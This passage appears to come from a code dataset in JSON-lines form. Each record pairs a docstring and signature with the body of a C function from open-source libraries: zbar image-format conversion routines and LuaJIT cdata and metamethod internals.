RGB_OFFSET(srcfmt->p.rgb.red);\n    gbits = RGB_SIZE(srcfmt->p.rgb.green);\n    gbit0 = RGB_OFFSET(srcfmt->p.rgb.green);\n    bbits = RGB_SIZE(srcfmt->p.rgb.blue);\n    bbit0 = RGB_OFFSET(srcfmt->p.rgb.blue);\n\n    srcl = src->width * srcfmt->p.rgb.bpp;\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcp -= srcl;\n        for(x = 0; x < dst->width; x++) {\n            if(x < src->width) {\n                uint8_t r, g, b;\n                uint32_t p = convert_read_rgb(srcp, srcfmt->p.rgb.bpp);\n                srcp += srcfmt->p.rgb.bpp;\n\n                /* FIXME endianness? */\n                r = ((p >> rbit0) << rbits) & 0xff;\n                g = ((p >> gbit0) << gbits) & 0xff;\n                b = ((p >> bbit0) << bbits) & 0xff;\n\n                /* FIXME color space? */\n                y0 = ((77 * r + 150 * g + 29 * b) + 0x80) >> 8;\n            }\n            *(dsty++) = y0;\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * srcfmt->p.rgb.bpp;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* append neutral UV plane to grayscale image */\n", "func_signal": "static void convert_uvp_append (zbar_image_t *dst,\n                                const zbar_format_def_t *dstfmt,\n                                const zbar_image_t *src,\n                                const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long n;\n    uv_roundup(dst, dstfmt);\n    dst->datalen = uvp_size(dst, dstfmt) * 2;\n    n = dst->width * dst->height;\n    dst->datalen += n;\n    assert(src->datalen >= src->width * src->height);\n    zprintf(24, \"dst=%dx%d (%lx) %lx src=%dx%d %lx\\n\",\n            dst->width, dst->height, n, dst->datalen,\n            src->width, src->height, src->datalen);\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    convert_y_resize(dst, dstfmt, src, srcfmt, n);\n    memset((uint8_t*)dst->data + n, 0x80, dst->datalen - n);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* resize y plane, drop extra columns/rows from the right/bottom,\n * or duplicate last column/row to pad missing data\n */\n", "func_signal": "static inline void convert_y_resize (zbar_image_t *dst,\n                                     const zbar_format_def_t *dstfmt,\n                                     const zbar_image_t *src,\n                                     const zbar_format_def_t *srcfmt,\n                                     size_t n)", "code": "{\n    uint8_t *psrc, *pdst;\n    unsigned width, height, xpad, y;\n\n    if(dst->width == src->width && dst->height == src->height) {\n        memcpy((void*)dst->data, src->data, n);\n        return;\n    }\n    psrc = (void*)src->data;\n    pdst = (void*)dst->data;\n    width = (dst->width > src->width) ? src->width : dst->width;\n    xpad = (dst->width > src->width) ? dst->width - src->width : 0;\n    height = (dst->height > src->height) ? src->height : dst->height;\n    for(y = 0; y < height; y++) {\n        memcpy(pdst, psrc, width);\n        pdst += width;\n        psrc += src->width;\n        if(xpad) {\n            memset(pdst, *(psrc - 1), xpad);\n            pdst += xpad;\n        }\n    }\n    psrc -= src->width;\n    for(; y < dst->height; y++) {\n        memcpy(pdst, psrc, width);\n        pdst += width;\n        if(xpad) {\n            memset(pdst, *(psrc - 1), xpad);\n            pdst += xpad;\n        }\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* rearrange interleaved UV componets */\n", "func_signal": "static void convert_uv_resample (zbar_image_t *dst,\n                                 const zbar_format_def_t *dstfmt,\n                                 const zbar_image_t *src,\n                                 const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long dstn;\n    uint8_t *dstp, flags;\n    const uint8_t *srcp;\n    unsigned srcl, x, y;\n    uint8_t y0 = 0, y1 = 0, u = 0x80, v = 0x80;\n\n    uv_roundup(dst, dstfmt);\n    dstn = dst->width * dst->height;\n    dst->datalen = dstn + uvp_size(dst, dstfmt) * 2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n\n    flags = (srcfmt->p.yuv.packorder ^ dstfmt->p.yuv.packorder) & 1;\n    srcp = src->data;\n\n    srcl = src->width + (src->width >> srcfmt->p.yuv.xsub2);\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcp -= srcl;\n        for(x = 0; x < dst->width; x += 2) {\n            if(x < src->width) {\n                if(!(srcfmt->p.yuv.packorder & 2)) {\n                    y0 = *(srcp++);  u = *(srcp++);\n                    y1 = *(srcp++);  v = *(srcp++);\n                }\n                else {\n                    u = *(srcp++);  y0 = *(srcp++);\n                    v = *(srcp++);  y1 = *(srcp++);\n                }\n                if(flags) {\n                    uint8_t tmp = u;  u = v;  v = tmp;\n                }\n            }\n            if(!(dstfmt->p.yuv.packorder & 2)) {\n                *(dstp++) = y0;  *(dstp++) = u;\n                *(dstp++) = y1;  *(dstp++) = v;\n            }\n            else {\n                *(dstp++) = u;  *(dstp++) = y0;\n                *(dstp++) = v;  *(dstp++) = y1;\n            }\n        }\n        if(x < src->width)\n            srcp += (src->width - x) * 2;\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* convert JPEG data via an intermediate format supported by libjpeg */\n", "func_signal": "static void convert_jpeg (zbar_image_t *dst,\n                          const zbar_format_def_t *dstfmt,\n                          const zbar_image_t *src,\n                          const zbar_format_def_t *srcfmt)", "code": "{\n    /* define intermediate image in a format supported by libjpeg\n     * (currently only grayscale)\n     */\n    zbar_image_t *tmp;\n    if(!src->src) {\n        tmp = zbar_image_create();\n        tmp->format = fourcc('Y','8','0','0');\n        _zbar_image_copy_size(tmp, dst);\n    }\n    else {\n        tmp = src->src->jpeg_img;\n        assert(tmp);\n        _zbar_image_copy_size(dst, tmp);\n    }\n\n    const zbar_format_def_t *tmpfmt = _zbar_format_lookup(tmp->format);\n    assert(tmpfmt);\n\n    /* convert to intermediate format */\n    _zbar_convert_jpeg_to_y(tmp, tmpfmt, src, srcfmt);\n\n    /* now convert to dst */\n    _zbar_image_copy_size(dst, tmp);\n\n    conversion_handler_t *func =\n        conversions[tmpfmt->group][dstfmt->group].func;\n\n    func(dst, dstfmt, tmp, tmpfmt);\n\n    if(!src->src)\n        zbar_image_destroy(tmp);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* make new image w/reference to the same image data */\n", "func_signal": "static void convert_copy (zbar_image_t *dst,\n                          const zbar_format_def_t *dstfmt,\n                          const zbar_image_t *src,\n                          const zbar_format_def_t *srcfmt)", "code": "{\n    if(src->width == dst->width &&\n       src->height == dst->height) {\n        zbar_image_t *s = (zbar_image_t*)src;\n        dst->data = src->data;\n        dst->datalen = src->datalen;\n        dst->cleanup = cleanup_ref;\n        dst->next = s;\n        _zbar_image_refcnt(s, 1);\n    }\n    else\n        /* NB only for GRAY/YUV_PLANAR formats */\n        convert_y_resize(dst, dstfmt, src, srcfmt, dst->width * dst->height);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* YUV planes to packed RGB\n * FIXME currently ignores color and grayscales the image\n */\n", "func_signal": "static void convert_yuvp_to_rgb (zbar_image_t *dst,\n                                 const zbar_format_def_t *dstfmt,\n                                 const zbar_image_t *src,\n                                 const zbar_format_def_t *srcfmt)", "code": "{\n    uint8_t *dstp, *srcy;\n    int drbits, drbit0, dgbits, dgbit0, dbbits, dbbit0;\n    unsigned long srcm, srcn;\n    unsigned x, y;\n    uint32_t p = 0;\n\n    dst->datalen = dst->width * dst->height * dstfmt->p.rgb.bpp;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    dstp = (void*)dst->data;\n\n    drbits = RGB_SIZE(dstfmt->p.rgb.red);\n    drbit0 = RGB_OFFSET(dstfmt->p.rgb.red);\n    dgbits = RGB_SIZE(dstfmt->p.rgb.green);\n    dgbit0 = RGB_OFFSET(dstfmt->p.rgb.green);\n    dbbits = RGB_SIZE(dstfmt->p.rgb.blue);\n    dbbit0 = RGB_OFFSET(dstfmt->p.rgb.blue);\n\n    srcm = uvp_size(src, srcfmt);\n    srcn = src->width * src->height;\n    assert(src->datalen >= srcn + 2 * srcm);\n    srcy = (void*)src->data;\n\n    for(y = 0; y < dst->height; y++) {\n        if(y >= src->height)\n            srcy -= src->width;\n        for(x = 0; x < dst->width; x++) {\n            if(x < src->width) {\n                /* FIXME color space? */\n                unsigned y0 = *(srcy++);\n                p = (((y0 >> drbits) << drbit0) |\n                     ((y0 >> dgbits) << dgbit0) |\n                     ((y0 >> dbbits) << dbbit0));\n            }\n            convert_write_rgb(dstp, p, dstfmt->p.rgb.bpp);\n            dstp += dstfmt->p.rgb.bpp;\n        }\n        if(x < src->width)\n            srcy += (src->width - x);\n    }\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* Allocate SIZE bytes of memory dynamically, with error checking,\n   and zero it.  */\n", "func_signal": "void *\nxzalloc (size_t size)", "code": "{\n  void *p;\n\n  p = xmalloc (size);\n  memset (p, 0, size);\n  return p;\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/libiconv-1.15/srclib/xmalloc.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* resample and resize UV plane(s)\n * FIXME currently ignores color and grayscales the image\n */\n", "func_signal": "static void convert_uvp_resample (zbar_image_t *dst,\n                                  const zbar_format_def_t *dstfmt,\n                                  const zbar_image_t *src,\n                                  const zbar_format_def_t *srcfmt)", "code": "{\n    unsigned long dstn, dstm2;\n    uv_roundup(dst, dstfmt);\n    dstn = dst->width * dst->height;\n    dstm2 = uvp_size(dst, dstfmt) * 2;\n    dst->datalen = dstn + dstm2;\n    dst->data = malloc(dst->datalen);\n    if(!dst->data) return;\n    convert_y_resize(dst, dstfmt, src, srcfmt, dstn);\n    if(dstm2)\n        memset((uint8_t*)dst->data + dstn, 0x80, dstm2);\n}", "path": "BGAQRCode-Android/zbar/src/main/jni/zbar/convert.c", "commit_date": "2018-01-08 00:00:00", "repo_name": "bingoogolapple/BGAQRCode-Android", "stars": 7868, "license": "None", "language": "c", "size": 28989}
{"docstring": "/* Allocate variable-sized or specially aligned C data object. */\n", "func_signal": "GCcdata *lj_cdata_newv(CTState *cts, CTypeID id, CTSize sz, CTSize align)", "code": "{\n  global_State *g;\n  MSize extra = sizeof(GCcdataVar) + sizeof(GCcdata) +\n\t\t(align > CT_MEMALIGN ? (1u<<align) - (1u<<CT_MEMALIGN) : 0);\n  char *p = lj_mem_newt(cts->L, extra + sz, char);\n  uintptr_t adata = (uintptr_t)p + sizeof(GCcdataVar) + sizeof(GCcdata);\n  uintptr_t almask = (1u << align) - 1u;\n  GCcdata *cd = (GCcdata *)(((adata + almask) & ~almask) - sizeof(GCcdata));\n  lua_assert((char *)cd - p < 65536);\n  cdatav(cd)->offset = (uint16_t)((char *)cd - p);\n  cdatav(cd)->extra = extra;\n  cdatav(cd)->len = sz;\n  g = cts->g;\n  setgcrefr(cd->nextgc, g->gc.root);\n  setgcref(g->gc.root, obj2gco(cd));\n  newwhite(g, obj2gco(cd));\n  cd->marked |= 0x80;\n  cd->gct = ~LJ_TCDATA;\n  cd->ctypeid = id;\n  return cd;\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Convert TValue and set C data value. */\n", "func_signal": "void lj_cdata_set(CTState *cts, CType *d, uint8_t *dp, TValue *o, CTInfo qual)", "code": "{\n  if (ctype_isconstval(d->info)) {\n    goto err_const;\n  } else if (ctype_isbitfield(d->info)) {\n    if (((d->info|qual) & CTF_CONST)) goto err_const;\n    lj_cconv_bf_tv(cts, d, dp, o);\n    return;\n  }\n\n  /* Get child type of pointer/array/field. */\n  lua_assert(ctype_ispointer(d->info) || ctype_isfield(d->info));\n  d = ctype_child(cts, d);\n\n  /* Resolve reference for field. */\n  if (ctype_isref(d->info)) {\n    lua_assert(d->size == CTSIZE_PTR);\n    dp = *(uint8_t **)dp;\n    d = ctype_child(cts, d);\n  }\n\n  /* Skip attributes and collect qualifiers. */\n  for (;;) {\n    if (ctype_isattrib(d->info)) {\n      if (ctype_attrib(d->info) == CTA_QUAL) qual |= d->size;\n    } else {\n      break;\n    }\n    d = ctype_child(cts, d);\n  }\n\n  lua_assert(ctype_hassize(d->info) && !ctype_isvoid(d->info));\n\n  if (((d->info|qual) & CTF_CONST)) {\n  err_const:\n    lj_err_caller(cts->L, LJ_ERR_FFI_WRCONST);\n  }\n\n  lj_cconv_ct_tv(cts, d, dp, o, 0);\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Negative caching of a few fast metamethods. See the lj_meta_fast() macro. */\n", "func_signal": "cTValue *lj_meta_cache(GCtab *mt, MMS mm, GCstr *name)", "code": "{\n  cTValue *mo = lj_tab_getstr(mt, name);\n  lua_assert(mm <= MM_FAST);\n  if (!mo || tvisnil(mo)) {  /* No metamethod? */\n    mt->nomm |= (uint8_t)(1u<<mm);  /* Set negative cache flag. */\n    return NULL;\n  }\n  return mo;\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Setup call to metamethod to be run by Assembler VM. */\n", "func_signal": "static TValue *mmcall(lua_State *L, ASMFunction cont, cTValue *mo,\n\t\t    cTValue *a, cTValue *b)", "code": "{\n  /*\n  **           |-- framesize -> top       top+1       top+2 top+3\n  ** before:   [func slots ...]\n  ** mm setup: [func slots ...] [cont|?]  [mo|tmtype] [a]   [b]\n  ** in asm:   [func slots ...] [cont|PC] [mo|delta]  [a]   [b]\n  **           ^-- func base                          ^-- mm base\n  ** after mm: [func slots ...]           [result]\n  **                ^-- copy to base[PC_RA] --/     for lj_cont_ra\n  **                          istruecond + branch   for lj_cont_cond*\n  **                                       ignore   for lj_cont_nop\n  ** next PC:  [func slots ...]\n  */\n  TValue *top = L->top;\n  if (curr_funcisL(L)) top = curr_topL(L);\n  setcont(top, cont);  /* Assembler VM stores PC in upper word. */\n  copyTV(L, top+1, mo);  /* Store metamethod and two arguments. */\n  copyTV(L, top+2, a);\n  copyTV(L, top+3, b);\n  return top+2;  /* Return new base. */\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Get C data value and convert to TValue. */\n", "func_signal": "int lj_cdata_get(CTState *cts, CType *s, TValue *o, uint8_t *sp)", "code": "{\n  CTypeID sid;\n\n  if (ctype_isconstval(s->info)) {\n    cdata_getconst(cts, o, s);\n    return 0;  /* No GC step needed. */\n  } else if (ctype_isbitfield(s->info)) {\n    return lj_cconv_tv_bf(cts, s, o, sp);\n  }\n\n  /* Get child type of pointer/array/field. */\n  lua_assert(ctype_ispointer(s->info) || ctype_isfield(s->info));\n  sid = ctype_cid(s->info);\n  s = ctype_get(cts, sid);\n\n  /* Resolve reference for field. */\n  if (ctype_isref(s->info)) {\n    lua_assert(s->size == CTSIZE_PTR);\n    sp = *(uint8_t **)sp;\n    sid = ctype_cid(s->info);\n    s = ctype_get(cts, sid);\n  }\n\n  /* Skip attributes. */\n  while (ctype_isattrib(s->info))\n    s = ctype_child(cts, s);\n\n  return lj_cconv_tv_ct(cts, s, sid, o, sp);\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for equality comparisons. __eq metamethod. */\n", "func_signal": "TValue *lj_meta_equal(lua_State *L, GCobj *o1, GCobj *o2, int ne)", "code": "{\n  /* Field metatable must be at same offset for GCtab and GCudata! */\n  cTValue *mo = lj_meta_fast(L, tabref(o1->gch.metatable), MM_eq);\n  if (mo) {\n    TValue *top;\n    uint32_t it;\n    if (tabref(o1->gch.metatable) != tabref(o2->gch.metatable)) {\n      cTValue *mo2 = lj_meta_fast(L, tabref(o2->gch.metatable), MM_eq);\n      if (mo2 == NULL || !lj_obj_equal(mo, mo2))\n\treturn (TValue *)(intptr_t)ne;\n    }\n    top = curr_top(L);\n    setcont(top, ne ? lj_cont_condf : lj_cont_condt);\n    copyTV(L, top+1, mo);\n    it = ~(uint32_t)o1->gch.gct;\n    setgcV(L, top+2, o1, it);\n    setgcV(L, top+3, o2, it);\n    return top+2;  /* Trigger metamethod call. */\n  }\n  return (TValue *)(intptr_t)ne;\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for LEN. __len metamethod. */\n", "func_signal": "TValue * LJ_FASTCALL lj_meta_len(lua_State *L, cTValue *o)", "code": "{\n  cTValue *mo = lj_meta_lookup(L, o, MM_len);\n  if (tvisnil(mo)) {\n    if (LJ_52 && tvistab(o))\n      tabref(tabV(o)->metatable)->nomm |= (uint8_t)(1u<<MM_len);\n    else\n      lj_err_optype(L, o, LJ_ERR_OPLEN);\n    return NULL;\n  }\n  return mmcall(L, lj_cont_ra, mo, o, LJ_52 ? o : niltv(L));\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* String interning of metamethod names for fast indexing. */\n", "func_signal": "void lj_meta_init(lua_State *L)", "code": "{\n#define MMNAME(name)\t\"__\" #name\n  const char *metanames = MMDEF(MMNAME);\n#undef MMNAME\n  global_State *g = G(L);\n  const char *p, *q;\n  uint32_t mm;\n  for (mm = 0, p = metanames; *p; mm++, p = q) {\n    GCstr *s;\n    for (q = p+2; *q && *q != '_'; q++) ;\n    s = lj_str_new(L, p, (size_t)(q-p));\n    /* NOBARRIER: g->gcroot[] is a GC root. */\n    setgcref(g->gcroot[GCROOT_MMNAME+mm], obj2gco(s));\n  }\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for ordered comparisons. String compare, __lt/__le metamethods. */\n", "func_signal": "TValue *lj_meta_comp(lua_State *L, cTValue *o1, cTValue *o2, int op)", "code": "{\n  if (LJ_HASFFI && (tviscdata(o1) || tviscdata(o2))) {\n    ASMFunction cont = (op & 1) ? lj_cont_condf : lj_cont_condt;\n    MMS mm = (op & 2) ? MM_le : MM_lt;\n    cTValue *mo = lj_meta_lookup(L, tviscdata(o1) ? o1 : o2, mm);\n    if (LJ_UNLIKELY(tvisnil(mo))) goto err;\n    return mmcall(L, cont, mo, o1, o2);\n  } else if (LJ_52 || itype(o1) == itype(o2)) {\n    /* Never called with two numbers. */\n    if (tvisstr(o1) && tvisstr(o2)) {\n      int32_t res = lj_str_cmp(strV(o1), strV(o2));\n      return (TValue *)(intptr_t)(((op&2) ? res <= 0 : res < 0) ^ (op&1));\n    } else {\n    trymt:\n      while (1) {\n\tASMFunction cont = (op & 1) ? lj_cont_condf : lj_cont_condt;\n\tMMS mm = (op & 2) ? MM_le : MM_lt;\n\tcTValue *mo = lj_meta_lookup(L, o1, mm);\n#if LJ_52\n\tif (tvisnil(mo) && tvisnil((mo = lj_meta_lookup(L, o2, mm))))\n#else\n\tcTValue *mo2 = lj_meta_lookup(L, o2, mm);\n\tif (tvisnil(mo) || !lj_obj_equal(mo, mo2))\n#endif\n\t{\n\t  if (op & 2) {  /* MM_le not found: retry with MM_lt. */\n\t    cTValue *ot = o1; o1 = o2; o2 = ot;  /* Swap operands. */\n\t    op ^= 3;  /* Use LT and flip condition. */\n\t    continue;\n\t  }\n\t  goto err;\n\t}\n\treturn mmcall(L, cont, mo, o1, o2);\n      }\n    }\n  } else if (tvisbool(o1) && tvisbool(o2)) {\n    goto trymt;\n  } else {\n  err:\n    lj_err_comp(L, o1, o2);\n    return NULL;\n  }\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Index C data by a TValue. Return CType and pointer. */\n", "func_signal": "CType *lj_cdata_index(CTState *cts, GCcdata *cd, cTValue *key, uint8_t **pp,\n\t\t      CTInfo *qual)", "code": "{\n  uint8_t *p = (uint8_t *)cdataptr(cd);\n  CType *ct = ctype_get(cts, cd->ctypeid);\n  ptrdiff_t idx;\n\n  /* Resolve reference for cdata object. */\n  if (ctype_isref(ct->info)) {\n    lua_assert(ct->size == CTSIZE_PTR);\n    p = *(uint8_t **)p;\n    ct = ctype_child(cts, ct);\n  }\n\ncollect_attrib:\n  /* Skip attributes and collect qualifiers. */\n  while (ctype_isattrib(ct->info)) {\n    if (ctype_attrib(ct->info) == CTA_QUAL) *qual |= ct->size;\n    ct = ctype_child(cts, ct);\n  }\n  lua_assert(!ctype_isref(ct->info));  /* Interning rejects refs to refs. */\n\n  if (tvisint(key)) {\n    idx = (ptrdiff_t)intV(key);\n    goto integer_key;\n  } else if (tvisnum(key)) {  /* Numeric key. */\n    idx = LJ_64 ? (ptrdiff_t)numV(key) : (ptrdiff_t)lj_num2int(numV(key));\n  integer_key:\n    if (ctype_ispointer(ct->info)) {\n      CTSize sz = lj_ctype_size(cts, ctype_cid(ct->info));  /* Element size. */\n      if (sz != CTSIZE_INVALID) {\n\tif (ctype_isptr(ct->info)) {\n\t  p = (uint8_t *)cdata_getptr(p, ct->size);\n\t} else if ((ct->info & (CTF_VECTOR|CTF_COMPLEX))) {\n\t  if ((ct->info & CTF_COMPLEX)) idx &= 1;\n\t  *qual |= CTF_CONST;  /* Valarray elements are constant. */\n\t}\n\t*pp = p + idx*(int32_t)sz;\n\treturn ct;\n      }\n    }\n  } else if (tviscdata(key)) {  /* Integer cdata key. */\n    GCcdata *cdk = cdataV(key);\n    CType *ctk = ctype_raw(cts, cdk->ctypeid);\n    if (ctype_isenum(ctk->info)) ctk = ctype_child(cts, ctk);\n    if (ctype_isinteger(ctk->info)) {\n      lj_cconv_ct_ct(cts, ctype_get(cts, CTID_INT_PSZ), ctk,\n\t\t     (uint8_t *)&idx, cdataptr(cdk), 0);\n      goto integer_key;\n    }\n  } else if (tvisstr(key)) {  /* String key. */\n    GCstr *name = strV(key);\n    if (ctype_isstruct(ct->info)) {\n      CTSize ofs;\n      CType *fct = lj_ctype_getfieldq(cts, ct, name, &ofs, qual);\n      if (fct) {\n\t*pp = p + ofs;\n\treturn fct;\n      }\n    } else if (ctype_iscomplex(ct->info)) {\n      if (name->len == 2) {\n\t*qual |= CTF_CONST;  /* Complex fields are constant. */\n\tif (strdata(name)[0] == 'r' && strdata(name)[1] == 'e') {\n\t  *pp = p;\n\t  return ct;\n\t} else if (strdata(name)[0] == 'i' && strdata(name)[1] == 'm') {\n\t  *pp = p + (ct->size >> 1);\n\t  return ct;\n\t}\n      }\n    } else if (cd->ctypeid == CTID_CTYPEID) {\n      /* Allow indexing a (pointer to) struct constructor to get constants. */\n      CType *sct = ctype_raw(cts, *(CTypeID *)p);\n      if (ctype_isptr(sct->info))\n\tsct = ctype_rawchild(cts, sct);\n      if (ctype_isstruct(sct->info)) {\n\tCTSize ofs;\n\tCType *fct = lj_ctype_getfield(cts, sct, name, &ofs);\n\tif (fct && ctype_isconstval(fct->info))\n\t  return fct;\n      }\n      ct = sct;  /* Allow resolving metamethods for constructors, too. */\n    }\n  }\n  if (ctype_isptr(ct->info)) {  /* Automatically perform '->'. */\n    if (ctype_isstruct(ctype_rawchild(cts, ct)->info)) {\n      p = (uint8_t *)cdata_getptr(p, ct->size);\n      ct = ctype_child(cts, ct);\n      goto collect_attrib;\n    }\n  }\n  *qual |= 1;  /* Lookup failed. */\n  return ct;  /* But return the resolved raw type. */\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Lookup metamethod for object. */\n", "func_signal": "cTValue *lj_meta_lookup(lua_State *L, cTValue *o, MMS mm)", "code": "{\n  GCtab *mt;\n  if (tvistab(o))\n    mt = tabref(tabV(o)->metatable);\n  else if (tvisudata(o))\n    mt = tabref(udataV(o)->metatable);\n  else\n    mt = tabref(basemt_obj(G(L), o));\n  if (mt) {\n    cTValue *mo = lj_tab_getstr(mt, mmname_str(G(L), mm));\n    if (mo)\n      return mo;\n  }\n  return niltv(L);\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Helper for TGET*. __index chain and metamethod. */\n", "func_signal": "cTValue *lj_meta_tget(lua_State *L, cTValue *o, cTValue *k)", "code": "{\n  int loop;\n  for (loop = 0; loop < LJ_MAX_IDXCHAIN; loop++) {\n    cTValue *mo;\n    if (LJ_LIKELY(tvistab(o))) {\n      GCtab *t = tabV(o);\n      cTValue *tv = lj_tab_get(L, t, k);\n      if (!tvisnil(tv) ||\n\t  !(mo = lj_meta_fast(L, tabref(t->metatable), MM_index)))\n\treturn tv;\n    } else if (tvisnil(mo = lj_meta_lookup(L, o, MM_index))) {\n      lj_err_optype(L, o, LJ_ERR_OPINDEX);\n      return NULL;  /* unreachable */\n    }\n    if (tvisfunc(mo)) {\n      L->top = mmcall(L, lj_cont_ra, mo, o, k);\n      return NULL;  /* Trigger metamethod call. */\n    }\n    o = mo;\n  }\n  lj_err_msg(L, LJ_ERR_GETLOOP);\n  return NULL;  /* unreachable */\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* In-place coercion of a number to a string. */\n", "func_signal": "static LJ_AINLINE int tostring(lua_State *L, TValue *o)", "code": "{\n  if (tvisstr(o)) {\n    return 1;\n  } else if (tvisnumber(o)) {\n    setstrV(L, o, lj_str_fromnumber(L, o));\n    return 1;\n  } else {\n    return 0;\n  }\n}", "path": "wrk2/deps/luajit/src/lj_meta.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Allocate a new C data object holding a reference to another object. */\n", "func_signal": "GCcdata *lj_cdata_newref(CTState *cts, const void *p, CTypeID id)", "code": "{\n  CTypeID refid = lj_ctype_intern(cts, CTINFO_REF(id), CTSIZE_PTR);\n  GCcdata *cd = lj_cdata_new(cts, refid, CTSIZE_PTR);\n  *(const void **)cdataptr(cd) = p;\n  return cd;\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
{"docstring": "/* Get constant value and convert to TValue. */\n", "func_signal": "static void cdata_getconst(CTState *cts, TValue *o, CType *ct)", "code": "{\n  CType *ctt = ctype_child(cts, ct);\n  lua_assert(ctype_isinteger(ctt->info) && ctt->size <= 4);\n  /* Constants are already zero-extended/sign-extended to 32 bits. */\n  if ((ctt->info & CTF_UNSIGNED) && (int32_t)ct->size < 0)\n    setnumV(o, (lua_Number)(uint32_t)ct->size);\n  else\n    setintV(o, (int32_t)ct->size);\n}", "path": "wrk2/deps/luajit/src/lj_cdata.c", "commit_date": "2014-05-15 00:00:00", "repo_name": "giltene/wrk2", "stars": 4115, "license": "apache-2.0", "language": "c", "size": 16695}
